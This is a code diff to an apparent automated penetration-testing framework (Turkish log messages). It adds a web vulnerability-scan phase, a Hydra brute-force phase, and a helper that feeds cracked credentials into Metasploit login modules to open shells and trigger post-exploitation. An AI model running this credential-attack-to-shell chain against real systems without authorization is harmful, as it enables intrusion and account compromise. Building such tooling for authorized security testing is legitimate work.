@@ -636,6 +636,18 @@ class Executor:
         delay = int(self.exec_cfg.get("delay_between_attempts", 5))
 
         for phase in phases:
+            # The vuln-scan phase runs external tools (web fingerprint, nuclei,
+            # dir brute, nikto) rather than MSF vectors; its findings are fed
+            # back into the engine, widening the exploit phase that follows.
+            if phase == "vulnscan":
+                self._run_vulnscan(engine, records)
+                continue
+            if phase == "bruteforce":
+                if self._run_bruteforce(engine, records):
+                    if stop_on_shell:
+                        return records
+                continue
+
             spent = 0
             # pending() is re-queried each iteration so adaptively-injected
             # vectors (added mid-phase) are picked up and re-sorted by score.
@@ -668,6 +680,171 @@ class Executor:
                     time.sleep(delay)
 
         return records
+
+    def _run_vulnscan(self, engine: StrategyEngine, records: list[AttemptRecord]) -> None:
+        """Active external-tool web/vuln scan; feed findings back into the plan.
+
+        Runs the web-enum tool suite (whatweb / nuclei / gobuster|ffuf / nikto)
+        against the target's web services and passes every finding to
+        ``engine.incorporate`` -- so a product fingerprinted here (Drupal,
+        Tomcat, Struts, ...) is turned into knowledge-base and version-matched
+        exploit vectors before the exploit phase runs. Any tool that is not
+        installed is skipped; a tool error never stops the run.
+        """
+        cfg = self.config.get("webenum", {}) or {}
+        if not cfg.get("enabled", True):
+            logger.info("vulnscan kapali (webenum.enabled=false).")
+            return
+        web_svcs = engine.profile.categorized.get("web", [])
+        if not web_svcs:
+            logger.info("vulnscan: web servisi yok, atlaniyor.")
+            return
+        try:
+            from .webenum import WebEnumRunner
+        except Exception as exc:  # noqa: BLE001
+            logger.warning("vulnscan atlandi (webenum yuklenemedi): %s", exc)
+            return
+
+        runner = WebEnumRunner(self.target, self.config)
+        status = runner.tool_status()
+        logger.info("vulnscan araclari -> %s",
+                    ", ".join(f"{t}:{'VAR' if ok else 'yok'}"
+                              for t, ok in status.items()))
+
+        all_findings: list[Finding] = []
+        limit = int(cfg.get("max_targets", 3))
+        for svc in web_svcs[:limit]:
+            started = datetime.now().isoformat(timespec="seconds")
+            try:
+                findings = runner.scan_service(svc)
+            except Exception as exc:  # noqa: BLE001 - a tool must never break the run
+                logger.warning("  web keşfi hatasi (port %s): %s", svc.port, exc)
+                findings = []
+            all_findings.extend(findings)
+            rec = AttemptRecord(
+                module=f"webenum@{svc.port}", kind="vulnscan", phase="vulnscan",
+                started_at=started,
+                finished_at=datetime.now().isoformat(timespec="seconds"),
+                fired=True, reason=f"{len(findings)} web bulgusu (port {svc.port})",
+            )
+            rec.findings = [f"{f.key}={f.value}" for f in findings][:60]
+            records.append(rec)
+
+        if all_findings:
+            new_vectors = engine.incorporate(all_findings)
+            for nv in new_vectors:
+                logger.info("  +vulnscan->plan: %s (skor=%.0f) — %s",
+                            nv.module, nv.score, nv.rationale)
+            logger.info("vulnscan: %d bulgu, plana %d yeni vektor eklendi.",
+                        len(all_findings), len(new_vectors))
+        else:
+            logger.info("vulnscan: bulgu yok (araclar kurulu degil ya da temiz).")
+
+    def _run_bruteforce(self, engine: StrategyEngine, records: list[AttemptRecord]) -> bool:
+        """Hydra credential attacks; feed creds back and try for a direct shell.
+
+        For each login-capable service hydra finds a credential on, the pair is
+        (a) handed to ``engine.incorporate`` -- reused across services and used
+        to unlock credential-gated exploits -- and (b) tried immediately against
+        the service's MSF login module with ``CreateSession`` so a working
+        credential becomes a shell right away. Returns True if a session landed.
+        """
+        cfg = self.config.get("bruteforce", {}) or {}
+        if not cfg.get("enabled", True):
+            logger.info("bruteforce kapali (bruteforce.enabled=false).")
+            return False
+        try:
+            from .bruteforce import _HYDRA_SERVICE, BruteForcer
+        except Exception as exc:  # noqa: BLE001
+            logger.warning("bruteforce atlandi (yuklenemedi): %s", exc)
+            return False
+
+        bf = BruteForcer(self.target, self.config)
+        if not bf.tool_status():
+            logger.info("bruteforce atlandi: hydra kurulu degil.")
+            return False
+
+        profile = engine.profile
+        all_creds: list[Finding] = []
+        max_services = int(cfg.get("max_services", 6))
+        count = 0
+        got_shell = False
+
+        for category in profile.categories():
+            if category not in _HYDRA_SERVICE:
+                continue  # hydra has no clean handler for this service
+            for svc in profile.categorized.get(category, []):
+                if count >= max_services:
+                    break
+                started = datetime.now().isoformat(timespec="seconds")
+                try:
+                    findings = bf.brute_service(category, svc)
+                except Exception as exc:  # noqa: BLE001 - never break the run
+                    logger.warning("  hydra hatasi (%s:%s): %s", category, svc.port, exc)
+                    findings = []
+                count += 1
+                rec = AttemptRecord(
+                    module=f"hydra/{category}@{svc.port}", kind="bruteforce",
+                    phase="bruteforce", started_at=started,
+                    finished_at=datetime.now().isoformat(timespec="seconds"),
+                    fired=True, reason=f"{len(findings)} kimlik bulundu",
+                )
+                rec.findings = [f"{u}:{p}" for u, p in (f.value for f in findings)]
+                records.append(rec)
+                all_creds.extend(findings)
+
+                # Turn a found credential straight into a session if the service
+                # supports a login->session MSF module (ssh/ftp/telnet/smb/...).
+                for f in findings:
+                    user, pw = f.value
+                    if self._try_login_session(engine, category, svc, user, pw, records):
+                        got_shell = True
+                        break
+                if got_shell:
+                    break
+            if got_shell:
+                break
+
+        if all_creds:
+            new_vectors = engine.incorporate(all_creds)
+            for nv in new_vectors:
+                logger.info("  +bruteforce->plan: %s (skor=%.0f) — %s",
+                            nv.module, nv.score, nv.rationale)
+            logger.info("bruteforce: %d kimlik, plana %d yeni vektor.",
+                        len(all_creds), len(new_vectors))
+        else:
+            logger.info("bruteforce: kimlik bulunamadi.")
+        return got_shell
+
+    def _try_login_session(
+        self, engine: StrategyEngine, category: str, svc: Any,
+        user: str, pw: str, records: list[AttemptRecord],
+    ) -> bool:
+        """Fire the category's MSF login module with one cred to drop a session."""
+        from .strategy import _LOGIN_MODULES
+
+        module = _LOGIN_MODULES.get(category)
+        if not module:
+            return False
+        vector = AttackVector(
+            phase="bruteforce", kind="login", module=module,
+            module_type="auxiliary", category=category,
+            service_port=svc.port, service_name=getattr(svc, "name", ""),
+            rationale=f"hydra kimligi ile oturum denemesi ({user})",
+            options={
+                "RHOSTS": self.target, "RPORT": svc.port,
+                "STOP_ON_SUCCESS": True, "BLANK_PASSWORDS": False,
+                "USER_AS_PASS": False, "VERBOSE": False, "CreateSession": True,
+                "_users": [user], "_passwords": [pw],
+            },
+        )
+        record = self.execute_vector(vector)
+        records.append(record)
+        if record.success:
+            logger.info("Oturum alindi (bruteforce fazi, %s).", category)
+            self._post_exploit(record, engine)
+            return True
+        return False
 
     def _post_exploit(self, record: AttemptRecord, engine: StrategyEngine) -> None:
         """Run the automated post-exploitation triage on a verified session."""
